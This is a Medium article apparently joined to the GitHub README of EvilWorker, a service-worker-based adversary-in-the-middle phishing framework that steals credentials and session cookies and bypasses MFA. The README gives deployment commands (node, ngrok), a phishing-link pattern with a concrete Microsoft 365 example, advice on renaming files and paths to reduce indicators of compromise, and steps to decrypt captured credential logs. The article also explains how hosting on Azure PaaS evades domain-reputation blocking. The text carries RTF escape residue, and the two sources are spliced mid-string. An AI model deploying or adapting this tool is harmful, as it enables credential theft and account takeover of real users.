+On the left, the official Microsoft Office 365 authentication service; on the right, the same service relayed in real time using an AiTM technique:\
+\
+Press enter or click to view image in full size\
+\
+Open-source frameworks\
+Today, attackers have access to a variety of sophisticated open-source frameworks that facilitate the exploitation of advanced techniques and the deployment of large-scale phishing campaigns.\
+Among these tools, Evilginx2 has established itself as the indispensable reference in the field of AiTM attacks. Its formidable effectiveness, stealth, and ease of use make it an essential subject of study for understanding the current threat landscape and emerging risks.\
+\
+A special mention goes to the Modlishka, Muraena, and EvilNoVNC solutions, which have also contributed to the evolution of AiTM techniques.\
+\
+Evilginx2\
+Evilginx is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing multi-factor authentication protection.\
+\
+Phishlets \'97 the key and innovative component of Evilginx2 \'97 are configuration files that precisely define how the tool should interact between the targeted user and the legitimate service. Thanks to its modular architecture, this solution can easily adapt to any platform, such as mainstream services (like Microsoft Office 365 or Google) or internal web applications, and dynamically bypass advanced security mechanisms.\
+\
+Concretely, a phishlet defines:\
+\
+The legitimate domains and subdomains for which traffic must be proxied.\
+The string substitution filters to dynamically modify the proxied website\'92s content.\
+The list of authentication information to capture (credentials, session token, etc.).\
+The parameters to add to POST requests relayed by the malicious proxy server to the legitimate service.\
+The custom JavaScript code to inject into the content of the proxied web pages.\
+Press enter or click to view image in full size\
+\
+A phishlet\'92s code snippet describing the behavior of the malicious proxy server when interacting with the Microsoft Office 365 authentication service.\
+To proxy the victim\'92s HTTP traffic, Evilginx2 systematically substitutes legitimate domain names \'97 listed within the phishlet in use \'97 with a fraudulent domain that resolves to the malicious proxy server. As a result, most of the requests initiated by the victim\'92s browser will automatically be forwarded to the attacker.\
+\
+Press enter or click to view image in full size\
+\
+At the top, an excerpt from the original content of the web page delivered by the legitimate service; at the bottom, its version modified by Evilginx2\
+Issues and limitations related to Evilginx2\
+Despite its effectiveness, Evilginx2 faces certain technical limitations inherent to its architecture.\
+\
+1. Development and maintenance of configuration files\
+The phishlet system allows the proxy server to be adapted to almost any legitimate service without modifying its underlying architecture, and benefits from an active community ecosystem developing configuration files for many popular websites.\
+However, this model requires the creation and maintenance of phishlets for customized enterprise solutions as well as for less common or recently updated services.\
+\
+In summary, while Evilginx2 remains formidably effective at bypassing modern authentication mechanisms, its use relies heavily on the availability and regular updating of phishlets for each service.\
+\
+2. Systematic substitution of legitimate domain names\
+In accordance with the directives of the phishlet in use, the malicious proxy server modifies the body of HTTP responses from the legitimate service before relaying them to the victim.\
+\
+Get Antoine Hazebrouck\'92s stories in your inbox\
+Join Medium for free to get updates from this writer.\
+\
+Enter your email\
+Subscribe\
+This approach, although effective for proxying a wide range of requests and bypassing advanced security mechanisms \'97 such as MFA \'97 nevertheless has two major drawbacks:\
+\
+The systematic substitution of legitimate domain names may disrupt the proper rendering and operation of the service.\
+This strategy can be easily neutralized by using a code obfuscation engine or by implementing a dynamic domain name generation process for critical resources.\
+Press enter or click to view image in full size\
+\
+A code snippet that concatenates two strings to create a valid URL, thereby preventing the substitution of this legitimate domain name with a malicious one.\
+If Evilginx2 is unable to successfully proxy authentication requests to the legitimate service, then its use becomes ineffective and loses all relevance.\
+\
+3. Effective management of malicious domain names\
+The success of a credential phishing operation largely depends on the management of malicious domain names and their ability to evade modern security filters.\
+\
+To ensure the stealth and effectiveness of campaigns, each new Red Teaming engagement requires the acquisition and configuration of new domains and subdomains. This regular rotation is essential: previously used domains are often flagged as suspicious by vigilant users and subsequently blacklisted by browsers, search engines, email providers, and other security solutions.\
+Once associated with malicious activities, these domains lose their credibility and become unusable for future operations.\
+\
+Reputation engines such as Cisco Talos, Symantec Sitereview, and Forcepoint ThreatSeeker frequently assess domain names according to several criteria: age, usage history, traffic volume, and content categorization. Consequently, a newly registered domain with no legitimate history is often categorized as \'93Newly Registered\'94 or \'93Uncategorized\'94. These classifications, considered suspicious, automatically trigger security alerts and are typically blocked by default on corporate networks, thereby significantly reducing the effectiveness of a malicious domain even before its first use.\
+Therefore, acquiring a domain with a good reputation presents a real dilemma:\
+\
+Opting to purchase a pre-existing domain name with a legitimate usage history \'97 which entails a high cost and increased traceability.\
+Undertaking an artificial maturation process \'97 which requires several months of effort to simulate legitimate use and enhance the domain\'92s credibility.\
+This reputational issue is often one of the main obstacles to the deployment of effective AiTM infrastructures, well ahead of technical considerations.\
+\
+Platform as a service (PaaS)\
+One possible solution to this problem could be to host the malicious proxy server on a Platform as a Service (PaaS) such as Azure Web Apps Service, as these platforms provide a major strategic advantage in terms of reputation and categorization.\
+Indeed, the shared nature of the service makes any degradation of the main domain\'92s reputation virtually impossible \'97 such an action would affect the entire ecosystem, thereby offering implicit protection against blocking or negative categorization mechanisms used by traditional security solutions.\
+Furthermore, hosting on this type of platform also allows for near-instantaneous redeployment of the malicious proxy server by simply creating a new subdomain.\
+\
+Press enter or click to view image in full size\
+\
+Results of the evaluation of the domain ahb-test.azurewebsites.net by the Cisco Talos reputation engine.\
+Unfortunately, Evilginx2 cannot be run on PaaS. Its architecture requires direct access to ports 80 and 443, custom SSL/TLS certificate management, and full DNS configuration \'97 operations that are incompatible with the network abstractions enforced by managed environments with restricted privileges.\
+\
+EvilWorker: a new method for proxying HTTP traffic\
+In response to the identified limitations, I have developed an innovative approach aimed at contributing to the evolution of AiTM techniques, both on an operational and strategic level.\
+Unlike the Evilginx2 method \'97 which requires manual configuration steps and the development of phishlets \'97 my goal was to design a fully autonomous and dynamic solution, capable of adapting in real time to any legitimate service.\
+\
+Service workers\
+To develop this solution, I leveraged service workers \'97 a native technology in modern browsers originally designed to enhance the user experience.\
+\
+Service workers essentially act as proxy servers that sit between web applications, the browser, and the network (when available). They are intended, among other things, to enable the creation of effective offline experiences, intercept network requests, and take appropriate action based on whether the network is available, and update assets residing on the server. They will also allow access to push notifications and background sync APIs.\
+\
+When a victim clicks on a phishing link, a service worker is immediately registered within their browser and acts as a malicious proxy. Nearly all requests made within the context of the web application are redirected to a remote proxy server \'97 controlled by the attacker \'97 which forwards them to the legitimate service and then relays the responses back to the victim.\
+\
+Press enter or click to view image in full size\
+\
+A diagram illustrating the operating principle of this new AiTM attack leveraging service workers.\
+This innovative approach offers a proxying mechanism that is far more efficient than Evilginx2, while overcoming the technical limitations inherent to its architecture \'97 namely, the need to develop and maintain configuration files for each service, as well as the issues related to the systematic substitution of legitimate domain names.\
+\
+\
+An example of service worker source code that intercepts and redirects HTTP requests to a remote proxy server.\
+A minimalist, robust, and adaptable architecture\
+The architecture I have developed \'97 based on leveraging service workers \'97 is minimalist, robust, and highly adaptable.\
+In fact, the malicious proxy server implementation relies exclusively on standard Node.js libraries, thereby avoiding any external dependencies that could potentially compromise its long-term reliability. Additionally, it requires only the use of a primary domain and a subdomain to operate, and it is compatible with PaaS, such as Azure App Service.\
+\
+Functionally, the tool includes:\
+\
+A session manager enabling simultaneous tracking of multiple victim users \'97 each of whom can interact with a different legitimate service.\
+A logging system for intercepted communications, which are systematically encrypted using the AES-256 algorithm in CTR mode.\
+A JavaScript code injection module specifically designed to bypass advanced security mechanisms implemented by the targeted services.\
+The limitations related to EvilWorker\
+Like Evilginx2, this new approach faces certain technical limitations inherent to its architecture. In particular, a service worker is registered for a specific origin and path. As a result, it cannot intercept cross-origin navigation requests \'97 such as a client-side redirection to a different domain, or the loading of an iframe from another origin.\
+\
+At the time of writing, I have found no generic and dynamic solution capable of proxying any cross-origin navigation requests.\
+Nevertheless, the following methods \'97 which must be tailored to each scenario \'97 can enable interception of cross-origin navigation requests initiated within the context of the targeted legitimate service:\
+\
+Injecting custom JavaScript code into the content of proxied web pages.\
+Modifying the body of HTTP responses from the legitimate service before relaying them to the victim.\
+Although EvilWorker is much more autonomous than Evilginx2, a few manual configuration steps are still required in certain specific cases.\
+\
+MutationObserver\
+To mitigate this issue, I leveraged MutationObserver \'97 a native JavaScript API in modern browsers designed to monitor any changes to the DOM in real time.\
+\
+The MutationObserver interface provides the ability to watch for changes being made to the DOM tree. It is designed as a replacement for the older Mutation Events feature, which was part of the DOM3 Events specification.\
+\
+This technology allows for the modification of dynamic HTML elements \'97 which may trigger navigation requests \'97 before they are executed, thereby redirecting HTTP traffic to the malicious proxy server.\
+\
+Press enter or click to view image in full size\
+\
+A code snippet using MutationObserver to modify the href and action attributes of dynamic HTML elements.\
+However, this solution still does not enable interception of cross-origin navigation requests generated by the Location interface or static HTML elements.\
+\
+\
+An example of static and dynamic HTML elements.\
+How to proxy a cross-origin navigation request\
+Here is a concrete example of how Microsoft Office 365 uses the Location.replace() and Location.assign() methods to redirect an identified user to an ADFS login portal:\
+\
+Press enter or click to view image in full size\
+\
+To redirect this cross-origin navigation request to the malicious proxy server, one possible solution is to modify the FederationRedirectUrl variable \'97 which is the source of the e parameter in the Kn function \'97 before relaying it to the victim.\
+\
+Because the authentication flow has now been successfully proxied, the victim is no longer redirected to an ADFS login portal:\
+\
+Press enter or click to view image in full size\
+\
+Demo of the EvilWorker solution\
+A real-time proxying of legitimate Microsoft Office 365, Stack Overflow, Netflix, and GitHub services, centralized on a single domain and subdomain provisioned by Azure Web Apps Service:\
+\
+Cybersecurity\
+Offensive Security\
+Phishing\
+Red Team\
+Man In The Middle Attack\
+6\
+\
+\
+\
+Antoine Hazebrouck\
+Written by Antoine Hazebrouck\
+14 followers\
+\'b7\
+1 following\
+\
+Follow\
+No responses yet\
+\
+Write a response\
+\
+What are your thoughts?\
+\
+Cancel\
+Respond\
+Recommended from Medium\
+Catch-22: Scanning for Compromised Public Keys\
+ASecuritySite: When Bob Met Alice\
+In\
+\
+ASecuritySite: When Bob Met Alice\
+\
+by\
+\
+Prof Bill Buchanan OBE FRSE\
+\
+Catch-22: Scanning for Compromised Public Keys\
+When I log onto my Linux servers and GitHub, I often don\'92t use a username and a password. For this, I store my public key on the server\'85\
+\
+6d ago\
+206\
+3\
+How Hackers Use Tunneling to Bypass Any Firewall (Red Team Playbook)\
+Very Lazy Tech \uc0\u55357 \u56446 \
+Very Lazy Tech \uc0\u55357 \u56446 \
+\
+How Hackers Use Tunneling to Bypass Any Firewall (Red Team Playbook)\
+\uc0\u10024  Link for the full article in the first comment\
+\
+Aug 14\
+40\
+2\
+Why These Cybersecurity Books Are Bestselling Weapons\
+Cyber Security Write-ups\
+In\
+\
+Cyber Security Write-ups\
+\
+by\
+\
+Aj\
+\
+Why These Cybersecurity Books Are Bestselling Weapons\
+How Paperbacks Became My Ultimate Digital Armor\
+\
+Aug 8\
+97\
+1\
+\'93Day 8: Mobile Hacking\uc0\u8202 \'97\u8202 How I Cracked a Banking App\'92s PIN in 10 Seconds ($5000 Bug)\'94\
+InfoSec Write-ups\
+In\
+\
+InfoSec Write-ups\
+\
+by\
+\
+Aman Sharma\
+\
+\'93Day 8: Mobile Hacking\uc0\u8202 \'97\u8202 How I Cracked a Banking App\'92s PIN in 10 Seconds ($5000 Bug)\'94\
+Two weeks ago, I reverse-engineered a \'93secure\'94 banking app that claimed to use \'93military-grade encryption.\'94 Turns out, they stored user\'85\
+\
+Aug 11\
+88\
+3\
+What is RSA And AES Encryption?\
+OSINT Team\
+In\
+\
+OSINT Team\
+\
+by\
+\
+Samxia99\
+\
+What is RSA And AES Encryption?\
+\'93Exploring How Symmetric and Asymmetric Encryption Work Together to Protect Your Data\'94 \uc0\u55357 \u56592 \u10024 \
+\
+Apr 29\
+63\
+How I Accidentally Built a Career Out of Doing Crimes Legally\
+Aeon Flex, Elriel Assoc. 2133 [NEON MAXIMA]\
+Aeon Flex, Elriel Assoc. 2133 [NEON MAXIMA]\
+\
+How I Accidentally Built a Career Out of Doing Crimes Legally\
+There is a strange line that runs through everything I have ever done. A line that feels more like a crack in concrete than a career path\'85\
+4d ago\
+33\
+1\
+See more recommendations\
+Help\
+\
+Status\
+\
+About\
+\
+Careers\
+\
+Press\
+\
+Blog\
+\
+Privacy\
+\
+Rules\
+\
+Terms\
+\
+Text to speech" and "Skip to content\
+Navigation Menu\
+Ahaz1701\
+EvilWorker\
+\
+Type / to search\
+Code\
+Issues\
+Pull requests\
+Actions\
+Projects\
+Security\
+Insights\
+Owner avatar\
+EvilWorker\
+Public\
+Ahaz1701/EvilWorker\
+Go to file\
+t\
+Name		\
+Ahaz1701\
+Ahaz1701\
+Show how to quickly deploy EvilWorker using Ngrok\
+be9ec6e\
+ \'b7 \
+2 weeks ago\
+404_not_found_lk48ZVr32WvU.html\
+Add files via upload\
+3 months ago\
+LICENSE\
+Initial commit\
+3 months ago\
+README.md\
+Show how to quickly deploy EvilWorker using Ngrok\
+2 weeks ago\
+decrypt_log_file.js\
+Fixed json decryption issue\
+3 months ago\
+index_smQGUDpTF7PN.html\
+Add files via upload\
+3 months ago\
+proxy_server.js\
+Add files via upload\
+3 months ago\
+script_Vx9Z6XN5uC3k.js\
+Add files via upload\
+3 months ago\
+service_worker_Mz8XO2ny1Pg5.js\
+Add files via upload\
+3 months ago\
+Repository files navigation\
+README\
+BSD-2-Clause license\
+article_cover\
+\
+EvilWorker\
+EvilWorker is a new Adversary-in-the-Middle (AiTM) attack framework \'97 based on leveraging service workers \'97 designed to conduct credential phishing campaigns.\
+\
+Full article: https://medium.com/@ahaz1701/evilworker-da94ae171249.\
+\
+TL;DR\
+Evilginx2 has established itself as the indispensable reference in the field of AiTM attacks. Thanks to its modular architecture, this solution can easily adapt to any platform, such as mainstream services (like Microsoft Office 365 or Google) or internal web applications, and dynamically bypass advanced security mechanisms including MFA.\
+\
+Despite its effectiveness, Evilginx2 faces certain technical limitations inherent to its architecture:\
+\
+Its use relies heavily on the development and maintenance of configuration files for each legitimate service.\
+The systematic substitution of legitimate domain names with a malicious one \'97 within HTTP responses relayed by the proxy server \'97 may disrupt the proper rendering and operation of the service. Furthermore, this strategy can be easily neutralized by using a code obfuscation engine or by implementing a dynamic domain name generation process for critical resources.\
+The acquisition and configuration of new domains and subdomains capable of bypassing modern security filters are necessary for each Red Teaming engagement.\
+In response to the identified limitations, I have developed an innovative approach aimed at contributing to the evolution of AiTM techniques, both on an operational and strategic level.\
+Unlike the Evilginx2 method\uc0\u8202 \'97\u8202 which requires manual configuration steps and the development of phishlets\u8202 \'97\u8202 my goal was to design a fully autonomous and dynamic solution, capable of adapting in real time to any legitimate service.\
+\
+To develop this solution, I leveraged service workers\uc0\u8202 \'97\u8202 a native technology in modern browsers originally designed to enhance the user experience.\
+When a victim clicks on a phishing link, a service worker is immediately registered within their browser and acts as a malicious proxy. Nearly all requests made within the context of the web application are redirected to a remote proxy server\uc0\u8202 \'97\u8202 controlled by the attacker\u8202 \'97\u8202 which forwards them to the legitimate service and then relays the responses back to the victim.\
+\
+This innovative approach offers a proxying mechanism that is far more efficient than Evilginx2, while overcoming the technical limitations inherent to its architecture\uc0\u8202 \'97\u8202 namely, the need to develop and maintain configuration files for each service, as well as the issues related to the systematic substitution of legitimate domain names.\
+Additionally, the malicious proxy server requires only the use of a primary domain and a subdomain to operate, and it is compatible with PaaS (unlike Evilginx2), such as Azure Web Apps Service. The shared nature of this type of platform makes any degradation of the main domain's reputation virtually impossible\uc0\u8202 \'97\u8202 such an action would affect the entire ecosystem, thereby offering implicit protection against blocking or negative categorization mechanisms used by traditional security solutions.\
+\
+Getting Started\
+Prerequisites\
+Note\
+\
+EvilWorker relies exclusively on standard Node.js libraries, thereby avoiding any external dependencies that could potentially compromise its long-term reliability.\
+\
+It is strongly recommended to use Node.js version 22.15.0 or higher to ensure support for zstd compression and decompression algorithms by the malicious proxy server.\
+\
+Installation\
+git clone https://github.com/Ahaz1701/EvilWorker.git\
+Deployment\
+Note\
+\
+It is strongly recommended to host EvilWorker on a PaaS such as Azure Web Apps Service.\
+\
+EvilWorker can be quickly deployed for testing or development purposes using Ngrok or similar tools:\
+\
+node proxy_server.js\
+ngrok http 3000\
+Usage\
+Note\
+\
+EvilWorker is an autonomous and dynamic solution that does not require the development of specific configuration files to adapt in real time to the targeted legitimate service.\
+\
+Demo of EvilWorker\
+A real-time proxying of legitimate Microsoft Office 365, Stack Overflow, Netflix, and GitHub services, centralized on a single domain and subdomain provisioned by Azure Web Apps:\
+\
+Watch the video\
+\
+Create a valid phishing link\
+To create a valid phishing link, you simply need to follow the pattern below:\
+\
+// Pattern to follow to create a valid phishing link\
+http(s)://$PHISHING_DOMAIN_NAME$PROXY_ENTRY_POINT&$PHISHED_URL_PARAMETER=$LEGITIMATE_LOGIN_PAGE_URL\
+\
+// A concrete example of a valid phishing link\
+https://ahb-test.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F\
+If the malicious proxy server fails to proxy the victim\'92s HTTP traffic, it is recommended to read the full article to understand the specific cases that may cause issues and how to resolve them.\
+\
+Minimize the IOCs\
+To minimize EvilWorker's indicators of compromise (IOCs), it is recommended to modify:\
+\
+The value of the PROXY_ENTRY_POINT variable:\
+const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";\
+The value of the PHISHED_URL_PARAMETER variable in all project files:\
+const PHISHED_URL_PARAMETER = "redirect_urI";\
+The names of the following files and paths in all project files:\
+const PROXY_FILES = \{\
+    index: "index_smQGUDpTF7PN.html",\
+    notFound: "404_not_found_lk48ZVr32WvU.html",\
+    script: "script_Vx9Z6XN5uC3k.js"\
+\};\
+\
+const PROXY_PATHNAMES = \{\
+    proxy: "/lNv1pC9AWPUY4gbidyBO",\
+    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",\
+    script: "/@",\
+    mutation: "/Mutation_o5y3f4O7jMGW",\
+    jsCookie: "/JSCookie_6X7dRqLg90mH",\
+    favicon: "/favicon.ico"\
+\};\
+Encrypt and decrypt credentials\
+Note\
+\
+EvilWorker includes a logging system for intercepted communications, which are systematically encrypted using the AES-256 algorithm in CTR mode.\
+\
+It is strongly recommended to modify the encryption key and store it more securely for real engagements.\
+\
+const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";\
+Intercepted communications are automatically stored in the phishing_logs directory at the root of the project.\
+\
+To decrypt them, simply run the following command:\
+\
+node decrypt_log_file.js $ENCRYPTED_LOG_FILE_PATH\
+Add custom JavaScript code\
+Note\
+\
+EvilWorker includes a JavaScript code injection module specifically designed to bypass advanced security mechanisms implemented by the targeted services.\
+\
+The script_Vx9Z6XN5uC3k.js file is automatically added to all HTML pages relayed by the malicious proxy server, so feel free to add your own JavaScript code to it.\
+\
+License\
+Distributed under the BSD-2-Clause License. See LICENSE for more information.\
+\
+Contact\
+LinkedIn: Antoine HAZEBROUCK\
+Email address: ahaz1701@gmail.com\
+\
+About\
+A new AiTM attack framework \'97 based on leveraging service workers \'97 designed to conduct credential phishing campaigns. Thanks to its minimalist, robust, and highly adaptable architecture, this solution can be easily deployed on PaaS.\
+\
+Resources\
+ Readme\
+License\
+ BSD-2-Clause license\
+ Activity\
+Stars\
+ 65 stars\
+Watchers\
+ 3 watching\
+Forks\
+ 15 forks\
+Report repository\
+Releases\
+No releases published\
+Packages\
+No packages published\
+Contributors\
+2\
+@Ahaz1701\
+Ahaz1701 Antoine HAZEBROUCK\
+@mellonaut\
+mellonaut\
+Languages\
+JavaScript\
+96.9%\
+ \
+HTML\
+3.1%\
+Footer\
+\'a9 2025 GitHub, Inc.\
+Footer navigation\
+Terms\
+Privacy\
+Security\
+Status\
+Docs\
+Contact\
+Manage cookies\
+Do not share my personal information\
+Copied! \
+Clone\
+\
+Remote URL selector navigation\
+HTTPS\
+SSH\
+GitHub CLI\
+Clone with HTTPS url\
+https://github.com/Ahaz1701/EvilWorker.git\
+Clone using the web URL." here "\cb1 @https://github.com/Ahaz1701/EvilWorker.git\cb3  "}
